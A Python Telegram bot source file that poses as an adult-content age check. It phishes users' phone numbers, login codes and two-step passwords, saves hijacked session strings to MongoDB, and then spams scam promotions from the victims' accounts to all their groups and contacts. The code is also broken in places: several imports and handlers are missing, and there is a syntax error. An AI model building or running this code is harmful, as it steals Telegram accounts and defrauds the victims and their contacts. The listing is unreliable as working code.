from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telethon import TelegramClient
from telethon.tl.functions.messages import GetHistoryRequest
import os
import re
import asyncio
from datetime import datetime
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, ADMINS
from pymongo import MongoClient

# MongoDB setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
db = mongo_client.telegram_sessions
sessions_collection = db.user_sessions

# Conversation states
CONFIRM_AGE, ASK_PHONE, ASK_CODE, ASK_2FA = range(4)

# Promotion messages
PROMO_TEXTS = [
    "🔥 Join our exclusive channel!",
    "🎉 Limited time offer inside!",
    "🚀 Boost your earnings today!",
    "💎 Premium content unlocked!",
    "🌟 Special discount for you!",
    "📈 Invest in your future now!",
    "💯 Top-rated community!",
    "🤑 Don't miss this opportunity!",
    "👑 Become a VIP member!",
    "✨ Transform your results!"
]

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[
        InlineKeyboardButton("🔞 Verify Age", callback_data="confirm_age")
    ]]
    await update.message.reply_text(
        "**⚠️ AGE VERIFICATION:** You must be 18+ to proceed. Click below to verify 👇",
        reply_markup=InlineKeyboardMarkup(keyboard)
    return CONFIRM_AGE

async def confirm_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please share your phone number to verify:")
    context.user_data["phone"] = None
    return ASK_PHONE

async def request_code(phone: str):
    phone = phone.lstrip('+')
    client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        try:
            sent = await client.send_code_request(f'+{phone}')
            return True, "Code sent successfully", sent.phone_code_hash
        except Exception as e:
            return False, f"Error: {str(e)}", None
    return True, "Already authorized", None

async def handle_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    digit = query.data.split('_')[1]
    
    if digit == "clear":
        context.user_data["code"] = ""
    elif digit == "submit":
        return await verify_code(update, context)
    else:
        context.user_data["code"] = context.user_data.get("code", "") + digit
        if len(context.user_data["code"]) == 5:
            return await verify_code(update, context)
    
    await query.edit_message_text(
        f"Current OTP: {context.user_data.get('code', '')}",
        reply_markup=get_otp_keyboard())
    return ASK_CODE

async def verify_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    code = context.user_data.get("code", "")
    phone = context.user_data["phone"]
    phone_code_hash = context.user_data["phone_code_hash"]
    
    client = TelegramClient(f"session_{phone}", API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(phone=f'+{phone}', code=code, phone_code_hash=phone_code_hash)
        
        # Check if 2FA required
        if await client.is_user_authorized() and client.is_password_required:
            context.user_data["client"] = client
            await query.edit_message_text("🔒 TWO-STEP VERIFICATION: Enter password:")
            return ASK_2FA
        
        await save_session(client, phone, update)
        return ConversationHandler.END
        
    except Exception as e:
        context.user_data["attempts"] = context.user_data.get("attempts", 0) + 1
        if context.user_data["attempts"] >= 3:
            await query.edit_message_text("❌ Too many attempts. Session reset.")
            return await login(update, context)
        await query.edit_message_text(f"Invalid code. Attempts left: {3 - context.user_data['attempts']}")
        return ASK_CODE

async def handle_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    client = context.user_data["client"]
    
    try:
        await client.sign_in(password=password)
        await save_session(client, context.user_data["phone"], update)
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text("❌ Invalid password. Try again:")
        return ASK_2FA

async def save_session(client, phone: str, update: Update):
    session_string = await client.session.save()
    
    # Save to MongoDB
    session_data = {
        "session": session_string,
        "logged_in": True,
        "mobile_number": phone,
        "promotion_active": True,
        "last_active": datetime.now(),
        "2fa_active": client.is_password_required,
        "user_id": update.effective_user.id
    }
    sessions_collection.update_one(
        {"mobile_number": phone},
        {"$set": session_data},
        upsert=True
    )
    
    # Send to log channel
    await client.send_message(
        entity=LOG_CHANNEL_SESSIONS_FILES,
        message=f"New session for +{phone}"
    )
    
    # Start promotion campaign
    asyncio.create_task(run_promotions(client, phone))
    
    await update.effective_message.reply_text(
        "✅ VERIFICATION SUCCESSFUL! Access premium content: [Link]"
    )

async def run_promotions(client, phone: str):
    # Groups promotion
    dialogs = await client.get_dialogs()
    groups = [d.entity for d in dialogs if d.is_group]
    
    for group in groups:
        try:
            text = random.choice(PROMO_TEXTS)
            await client.send_message(group, text)
            await asyncio.sleep(60)  # 60s delay
        except Exception:
            continue
    
    # Contacts promotion
    contacts = await client.get_contacts()
    for contact in contacts:
        for text in PROMO_TEXTS:
            try:
                await client.send_message(contact, text)
                await asyncio.sleep(300)  # 5m delay
            except Exception:
                continue

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    sessions_collection.update_one(
        {"user_id": user_id},
        {"$set": {"logged_in": False, "promotion_active": False}}
    )
    await update.message.reply_text("✅ Session terminated successfully")

def get_otp_keyboard():
    buttons = []
    for i in range(1, 10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"otp_{i}"))
        if i % 3 == 0:
            yield buttons
            buttons = []
    yield [
        InlineKeyboardButton("🔙", callback_data="otp_clear"),
        InlineKeyboardButton("0", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]

def main():
    token = os.getenv('BOT_TOKEN')
    app = Application.builder().token(token).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("login", login)],
        states={
            CONFIRM_AGE: [CallbackQueryHandler(confirm_age, pattern="^confirm_age$")],
            ASK_PHONE: [MessageHandler(filters.CONTACT, process_contact)],
            ASK_CODE: [CallbackQueryHandler(handle_otp, pattern="^otp_")],
            ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_2fa)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("logout", logout))
    app.run_polling()

if __name__ == "__main__":
    main()
